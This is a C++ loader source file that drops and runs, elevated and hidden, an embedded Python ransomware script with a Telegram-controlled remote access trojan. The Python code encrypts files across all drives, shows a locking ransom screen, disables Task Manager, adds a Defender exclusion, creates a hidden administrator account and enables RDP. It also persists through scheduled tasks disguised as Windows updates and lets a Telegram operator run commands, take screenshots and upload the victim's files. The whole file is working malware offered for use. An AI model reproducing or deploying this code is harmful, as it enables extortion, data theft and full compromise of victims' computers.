// RansomwareLoader.cpp – Embeds Python Ransomware + RAT (Fixed Raw String)
// Compile on Arch Linux with MinGW-w64:
//   x86_64-w64-mingw32-g++ -o RansomwareLoader.exe RansomwareLoader.cpp -lshlwapi -lshell32 -static

#include <windows.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <cstdlib>
#include <cstdio>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")

// ---------- EMBEDDED PYTHON SCRIPT (CUSTOM RAW STRING DELIMITER) ----------
// Using delimiter "PY" to avoid conflicts with triple quotes inside the script.
static const char* PythonScript = R"PY(
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ransomware Simulator v2.1 – Full Telegram Integration + Auto User Creation
- Encrypts files, locks screen, disables power options
- Creates hidden admin user, sends credentials to Telegram
- Scheduled task persistence (startup + hourly)
- Telegram RAT: /screenshot, /cmd, /upload, /download, /system, /help
"""

import os
import sys
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
import base64
import json
import time
import threading
import shutil
import subprocess
import ctypes
import winreg
import random
import string
import socket
from datetime import datetime
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# ---------- CONFIGURATION (EDIT THESE!) ----------
PASSWORD = "unlock123"                # Ransomware unlock password
LOGO_FILENAME = "logo.png"            # Your logo (optional)
DELETE_DATE = "01/01/2028"            # dd/mm/yyyy – after this, no decryption
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN"     # <-- PUT YOUR TOKEN HERE (from @BotFather)
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"     # <-- PUT YOUR CHAT ID (from @userinfobot)
ENCRYPT_EXT = ".encrypted"
SALT = b"fixed_salt_2025"
KEY_FILE = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'ransom_key.bin')
EXCLUDED_FOLDERS = ["Windows", "Program Files", "Program Files (x86)", "System32", "AppData", "Recovery"]

# ---------- Resource path for bundling ----------
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

LOGO_PATH = resource_path(LOGO_FILENAME)

# ---------- Admin check ----------
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print("[!] This script requires administrator privileges.")
    print("[*] Restarting with admin rights...")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# ---------- Telegram functions ----------
try:
    import requests
except ImportError:
    print("[!] Requests module not installed. Please install: pip install requests")
    sys.exit(1)

def send_telegram(message):
    if not TELEGRAM_TOKEN or "YOUR_BOT_TOKEN" in TELEGRAM_TOKEN:
        print("[!] Telegram token not set. Message not sent.")
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
        r = requests.post(url, data=data, timeout=10)
        if r.status_code != 200:
            print(f"[!] Telegram error: {r.text}")
    except Exception as e:
        print(f"[!] Telegram send failed: {e}")

def get_system_info():
    hostname = os.environ.get('COMPUTERNAME', 'Unknown')
    username = os.environ.get('USERNAME', 'Unknown')
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except:
        local_ip = "Unknown"
    try:
        external_ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        external_ip = "Unknown"
    return {'hostname': hostname, 'username': username, 'local_ip': local_ip, 'external_ip': external_ip}

# ---------- Create hidden admin user and enable RDP ----------
def create_hidden_user():
    try:
        username = "windows_update"  # You can change this
        chars = string.ascii_letters + string.digits
        password = ''.join(random.choice(chars) for _ in range(12))

        # Create user
        subprocess.run(f"net user {username} {password} /add", shell=True, capture_output=True)
        subprocess.run(f"net localgroup Administrators {username} /add", shell=True, capture_output=True)
        # Hide user from login screen
        subprocess.run(f"reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f", shell=True, capture_output=True)
        # Enable Remote Desktop (RDP) if not already enabled
        subprocess.run(f"reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f", shell=True, capture_output=True)
        # Allow RDP in firewall
        subprocess.run("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes", shell=True, capture_output=True)
        return username, password
    except Exception as e:
        print(f"[!] User creation failed: {e}")
        return None, None

# ---------- Persistence via Scheduled Task ----------
def add_persistence(exe_path):
    try:
        task_name = "WindowsUpdateHelper"
        subprocess.run(f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onstart /f', shell=True, capture_output=True)
        subprocess.run(f'schtasks /create /tn "{task_name}_hourly" /tr "{exe_path}" /sc hourly /f', shell=True, capture_output=True)
        print("[+] Scheduled task persistence added.")
    except Exception as e:
        print(f"[!] Persistence failed: {e}")

# ---------- Other functions (Defender bypass, power options, encryption) ----------
def bypass_defender():
    try:
        exe_path = os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
        subprocess.run(["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{exe_path}'"], capture_output=True, check=False)
    except: pass

def disable_power_options():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        winreg.CreateKey(key, subkey)
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "NoClose", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(regkey, "NoLogOff", 0, winreg.REG_DWORD, 1)
        subkey2 = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        winreg.CreateKey(key, subkey2)
        with winreg.OpenKey(key, subkey2, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    except: pass

def restore_power_options():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.DeleteValue(regkey, "NoClose")
            winreg.DeleteValue(regkey, "NoLogOff")
        subkey2 = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.OpenKey(key, subkey2, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.DeleteValue(regkey, "DisableTaskMgr")
    except: pass

def derive_key(password: str) -> bytes:
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=SALT, iterations=100000)
    return base64.urlsafe_b64encode(kdf.derive(password.encode()))

def encrypt_file(file_path: Path, fernet):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(file_path.with_suffix(file_path.suffix + ENCRYPT_EXT), 'wb') as f:
            f.write(encrypted)
        os.remove(file_path)
        return True
    except: return False

def decrypt_file(file_path: Path, fernet):
    try:
        with open(file_path, 'rb') as f:
            encrypted = f.read()
        decrypted = fernet.decrypt(encrypted)
        orig_path = file_path.with_suffix('')
        with open(orig_path, 'wb') as f:
            f.write(decrypted)
        os.remove(file_path)
        return True
    except: return False

def walk_directories(root_path):
    for item in root_path.rglob('*'):
        if item.is_file():
            if item.suffix == ENCRYPT_EXT: continue
            if any(excl in str(item.parent) for excl in EXCLUDED_FOLDERS): continue
            yield item

def encrypt_all_files(fernet):
    drives = [d for d in Path('/').iterdir() if d.is_dir() and d.drive]
    for drive in drives:
        for file_path in walk_directories(drive):
            encrypt_file(file_path, fernet)

def decrypt_all_files(fernet):
    drives = [d for d in Path('/').iterdir() if d.is_dir() and d.drive]
    for drive in drives:
        for enc_file in drive.rglob('*' + ENCRYPT_EXT):
            decrypt_file(enc_file, fernet)

# ---------- Telegram RAT (runs in a separate thread) ----------
last_update_id = 0

def telegram_rat():
    global last_update_id
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates?offset={last_update_id+1}"
            r = requests.get(url, timeout=10)
            if r.status_code != 200:
                time.sleep(5)
                continue
            data = r.json()
            if not data.get('ok'):
                time.sleep(5)
                continue
            for update in data['result']:
                last_update_id = update['update_id']
                if 'message' in update and 'text' in update['message']:
                    cmd = update['message']['text'].strip()
                    chat_id = update['message']['chat']['id']
                    if chat_id != int(TELEGRAM_CHAT_ID):
                        continue
                    handle_command(cmd, chat_id)
            time.sleep(2)
        except Exception as e:
            print(f"[!] RAT error: {e}")
            time.sleep(5)

def handle_command(cmd, chat_id):
    try:
        if cmd == '/help':
            msg = "📋 *Commands:*\n/screenshot - Capture screen\n/cmd <command> - Execute command\n/upload <filepath> - Upload file\n/download <url> - Download file\n/system - System info\n/help - This help"
            send_message(chat_id, msg)
        elif cmd == '/screenshot':
            screenshot_path = os.path.join(os.environ['TEMP'], 'screenshot.jpg')
            try:
                import pyautogui
                pyautogui.screenshot(screenshot_path)
                send_photo(chat_id, screenshot_path)
                os.remove(screenshot_path)
            except ImportError:
                send_message(chat_id, "❌ pyautogui not installed. Install: pip install pyautogui")
            except Exception as e:
                send_message(chat_id, f"❌ Screenshot failed: {e}")
        elif cmd.startswith('/cmd '):
            command = cmd[5:]
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                if len(output) > 4000:
                    output = output[:4000] + "\n... (truncated)"
                send_message(chat_id, f"💻 *Command output:*\n```\n{output}\n```")
            except Exception as e:
                send_message(chat_id, f"❌ Error: {e}")
        elif cmd.startswith('/upload '):
            filepath = cmd[8:]
            if os.path.isfile(filepath):
                send_document(chat_id, filepath)
                send_message(chat_id, f"📎 File uploaded: {os.path.basename(filepath)}")
            else:
                send_message(chat_id, f"❌ File not found: {filepath}")
        elif cmd.startswith('/download '):
            url = cmd[10:]
            filename = os.path.basename(url) or "downloaded_file"
            dest = os.path.join(os.environ['TEMP'], filename)
            try:
                r = requests.get(url, stream=True)
                with open(dest, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        f.write(chunk)
                send_message(chat_id, f"✅ Downloaded to: {dest}")
            except Exception as e:
                send_message(chat_id, f"❌ Download failed: {e}")
        elif cmd == '/system':
            info = get_system_info()
            msg = f"🖥️ *System Info*\nHost: {info['hostname']}\nUser: {info['username']}\nLocal IP: {info['local_ip']}\nExternal IP: {info['external_ip']}\nOS: {os.name}"
            send_message(chat_id, msg)
        else:
            send_message(chat_id, "Unknown command. Send /help for list.")
    except Exception as e:
        send_message(chat_id, f"❌ Error: {e}")

def send_message(chat_id, text, parse_mode='Markdown'):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
        requests.post(url, data=data, timeout=10)
    except: pass

def send_photo(chat_id, path):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        with open(path, 'rb') as f:
            files = {'photo': f}
            data = {'chat_id': chat_id}
            requests.post(url, files=files, data=data, timeout=10)
    except: pass

def send_document(chat_id, path):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
        with open(path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': chat_id}
            requests.post(url, files=files, data=data, timeout=10)
    except: pass

# ---------- Lock Screen UI ----------
class RansomwareLock:
    def __init__(self, root):
        self.root = root
        self.root.title("Ransomware Lock Screen")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.BG_COLOR = "#1a1a2e"
        self.root.configure(bg=self.BG_COLOR)

        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.bind("<Escape>", lambda e: None)
        self.root.bind("<Alt-F4>", lambda e: None)

        self.check_deletion_date()

        self.content_frame = tk.Frame(self.root, bg=self.BG_COLOR)
        self.content_frame.place(relx=0.5, rely=0.5, anchor="center")

        # Logo
        self.logo_image = None
        try:
            if os.path.exists(LOGO_PATH):
                img = Image.open(LOGO_PATH)
                img = img.resize((200, 200), Image.Resampling.LANCZOS)
                self.logo_image = ImageTk.PhotoImage(img)
                logo_label = tk.Label(self.content_frame, image=self.logo_image, bg=self.BG_COLOR)
                logo_label.pack(pady=20)
            else:
                raise FileNotFoundError
        except Exception:
            fallback = """
            .-.-.   .-.-.   .-.-.   .-.-.   .-.-.   .-.-.   .-.-.
           /| | |\ /| | |\ /| | |\ /| | |\ /| | |\ /| | |\ /| | |\
          | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
           \| | |/ \| | |/ \| | |/ \| | |/ \| | |/ \| | |/ \| | |/
            `-'-'   `-'-'   `-'-'   `-'-'   `-'-'   `-'-'   `-'-'
                         HACK THE PLANET
            """
            logo_label = tk.Label(self.content_frame, text=fallback, font=("Courier", 10),
                                  fg="#00ff00", bg=self.BG_COLOR, justify="center")
            logo_label.pack(pady=20)

        tk.Label(self.content_frame, text="UNAUTHORIZED ACCESS", font=("Arial", 28, "bold"),
                 fg="#ff4444", bg=self.BG_COLOR).pack(pady=5)
        tk.Label(self.content_frame, text="Your files have been encrypted.\nEnter the password to decrypt.",
                 font=("Arial", 14), fg="#cccccc", bg=self.BG_COLOR).pack(pady=10)

        frame = tk.Frame(self.content_frame, bg=self.BG_COLOR)
        frame.pack(pady=15)
        tk.Label(frame, text="Password:", font=("Arial", 14), fg="white", bg=self.BG_COLOR).grid(row=0, column=0, padx=5)
        self.password_entry = tk.Entry(frame, show="*", width=20, font=("Arial", 14))
        self.password_entry.grid(row=0, column=1, padx=5)
        self.password_entry.bind("<Return>", lambda e: self.unlock())
        tk.Button(frame, text="UNLOCK", command=self.unlock, bg="#ff4444", fg="white",
                  font=("Arial", 12, "bold"), padx=10, pady=5).grid(row=0, column=2, padx=10)

        self.status = tk.Label(self.content_frame, text="", font=("Arial", 12), bg=self.BG_COLOR)
        self.status.pack(pady=10)

        self.password_entry.focus_set()
        self.root.update_idletasks()
        self.content_frame.update_idletasks()
        self.content_frame.place(relx=0.5, rely=0.5, anchor="center")

        # --- Main actions ---
        if not os.path.exists(KEY_FILE):
            # Create hidden user and enable RDP
            username, userpass = create_hidden_user()
            # Add persistence
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            add_persistence(exe_path)
            # Send initial notification
            info = get_system_info()
            msg = f"🚨 *RANSOMWARE ACTIVATED*\n\nHost: {info['hostname']}\nUser: {info['username']}\nLocal IP: {info['local_ip']}\nExternal IP: {info['external_ip']}\n\n*New admin user created:*\nUsername: `{username}`\nPassword: `{userpass}`\nRDP has been enabled.\n\nRansomware Password: `{PASSWORD}`"
            send_telegram(msg)
            # Start encryption in background
            self.status.config(text="Encrypting files... Please wait.", fg="#00ff00")
            self.root.update()
            threading.Thread(target=self.do_encryption, daemon=True).start()
            # Start Telegram RAT
            threading.Thread(target=telegram_rat, daemon=True).start()
        else:
            self.status.config(text="System locked. Enter password to decrypt.", fg="#ffaa00")
            # Start RAT anyway (in case it was stopped)
            threading.Thread(target=telegram_rat, daemon=True).start()

    def check_deletion_date(self):
        try:
            delete_date = datetime.strptime(DELETE_DATE, "%d/%m/%Y")
            if datetime.now() > delete_date:
                messagebox.showerror("FATAL ERROR", "The deadline has passed!\nYour files are gone forever!")
                self.root.destroy()
                sys.exit(1)
        except: pass

    def do_encryption(self):
        key = derive_key(PASSWORD)
        fernet = Fernet(key)
        with open(KEY_FILE, 'wb') as f:
            f.write(key)
        encrypt_all_files(fernet)
        disable_power_options()
        bypass_defender()
        self.root.after(0, lambda: self.status.config(text="System locked. Enter password to decrypt.", fg="#ffaa00"))

    def unlock(self):
        entered = self.password_entry.get()
        if entered == PASSWORD:
            self.status.config(text="Decrypting files... Please wait.", fg="#00ff00")
            self.root.update()
            if os.path.exists(KEY_FILE):
                with open(KEY_FILE, 'rb') as f:
                    key = f.read()
                fernet = Fernet(key)
                decrypt_all_files(fernet)
                os.remove(KEY_FILE)
                restore_power_options()
                messagebox.showinfo("Success", "All files decrypted. System will now reboot.")
                self.root.destroy()
                os.system("shutdown /r /t 5")
            else:
                messagebox.showerror("Error", "No key found.")
        else:
            self.status.config(text="❌ WRONG PASSWORD! Try again.", fg="#ff4444")
            self.password_entry.delete(0, tk.END)
            self.password_entry.focus()

if __name__ == "__main__":
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    root = tk.Tk()
    app = RansomwareLock(root)
    root.mainloop()
)PY";

// ---------- Helper Functions (C++ side) ----------
static std::string ExpandEnv(const std::string& path) {
    char buffer[MAX_PATH];
    if (ExpandEnvironmentStringsA(path.c_str(), buffer, MAX_PATH))
        return std::string(buffer);
    return path;
}

static bool FileExists(const std::string& path) {
    DWORD attrib = GetFileAttributesA(path.c_str());
    return (attrib != INVALID_FILE_ATTRIBUTES && !(attrib & FILE_ATTRIBUTE_DIRECTORY));
}

static bool WriteScriptToTemp(const std::string& script, std::string& outPath) {
    std::string tempDir = ExpandEnv("%TEMP%");
    if (tempDir.empty()) tempDir = "C:\\Temp";
    outPath = tempDir + "\\ransomware.py";
    std::ofstream file(outPath, std::ios::binary);
    if (!file) return false;
    file.write(script.c_str(), script.size());
    file.close();
    return true;
}

static std::string FindPython() {
    // Common installation paths
    const char* possiblePaths[] = {
        "C:\\Python3\\python.exe",
        "C:\\Python310\\python.exe",
        "C:\\Python311\\python.exe",
        "C:\\Python312\\python.exe",
        "C:\\Python313\\python.exe",
        "C:\\Program Files\\Python3\\python.exe",
        "C:\\Program Files (x86)\\Python3\\python.exe",
        nullptr
    };
    // Build user-specific paths
    std::string user = getenv("USERNAME") ? getenv("USERNAME") : "";
    std::vector<std::string> userPaths = {
        "C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python310\\python.exe",
        "C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python311\\python.exe",
        "C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python312\\python.exe",
        "C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python313\\python.exe"
    };

    for (int i = 0; possiblePaths[i] != nullptr; ++i) {
        if (FileExists(possiblePaths[i]))
            return std::string(possiblePaths[i]);
    }
    for (const auto& p : userPaths) {
        if (FileExists(p))
            return p;
    }

    // Try PATH
    char* pathVar = getenv("PATH");
    if (pathVar) {
        std::string pathEnv(pathVar);
        size_t pos = 0;
        std::string token;
        while ((pos = pathEnv.find(';')) != std::string::npos) {
            token = pathEnv.substr(0, pos);
            if (!token.empty()) {
                std::string candidate = token + "\\python.exe";
                if (FileExists(candidate)) return candidate;
            }
            pathEnv.erase(0, pos + 1);
        }
        if (!pathEnv.empty()) {
            std::string candidate = pathEnv + "\\python.exe";
            if (FileExists(candidate)) return candidate;
        }
    }

    // Try registry
    HKEY hKey;
    DWORD type;
    char installPath[MAX_PATH];
    DWORD size = MAX_PATH;
    for (const char* version : {"3.10", "3.11", "3.12", "3.13"}) {
        std::string regPath = "SOFTWARE\\Python\\PythonCore\\" + std::string(version) + "\\InstallPath";
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            if (RegQueryValueExA(hKey, "", NULL, &type, (LPBYTE)installPath, &size) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                std::string exePath = std::string(installPath) + "\\python.exe";
                if (FileExists(exePath)) return exePath;
            }
            RegCloseKey(hKey);
        }
    }

    return "";
}

// ---------- Elevate and Run ----------
static void RunAsAdminAndExecute(const std::string& pythonExe, const std::string& scriptPath) {
    std::string cmdLine = "\"" + pythonExe + "\" \"" + scriptPath + "\"";
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = "runas";
    sei.lpFile = "cmd.exe";
    sei.lpParameters = ("/c " + cmdLine).c_str();
    sei.nShow = SW_HIDE;

    if (ShellExecuteExA(&sei)) {
        WaitForInputIdle(sei.hProcess, 10000);
        CloseHandle(sei.hProcess);
    }
    else {
        // Fallback: try direct (in case already admin)
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (CreateProcessA(NULL, (LPSTR)cmdLine.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}

// ---------- Main ----------
int main() {
    // Check if running as admin; if not, relaunch with runas
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &AdministratorsGroup)) {
        CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin);
        FreeSid(AdministratorsGroup);
    }
    if (!isAdmin) {
        // Restart with runas verb
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        sei.lpVerb = "runas";
        sei.lpFile = GetCommandLineA();
        sei.nShow = SW_HIDE;
        if (ShellExecuteExA(&sei)) {
            WaitForInputIdle(sei.hProcess, 10000);
            CloseHandle(sei.hProcess);
        }
        return 0;
    }

    // Write Python script to temp
    std::string scriptPath;
    if (!WriteScriptToTemp(PythonScript, scriptPath)) {
        // Fallback: current directory
        scriptPath = "ransomware.py";
        std::ofstream file(scriptPath, std::ios::binary);
        if (!file) return 1;
        file.write(PythonScript, strlen(PythonScript));
        file.close();
    }

    // Find Python
    std::string pythonExe = FindPython();
    if (pythonExe.empty()) {
        MessageBoxA(NULL, "Python not found. Please install Python 3.8+.\n\nThe ransomware script cannot run without Python.", "Error", MB_ICONERROR);
        return 1;
    }

    // Launch with elevation (already admin, but use runas to ensure)
    RunAsAdminAndExecute(pythonExe, scriptPath);

    return 0;
}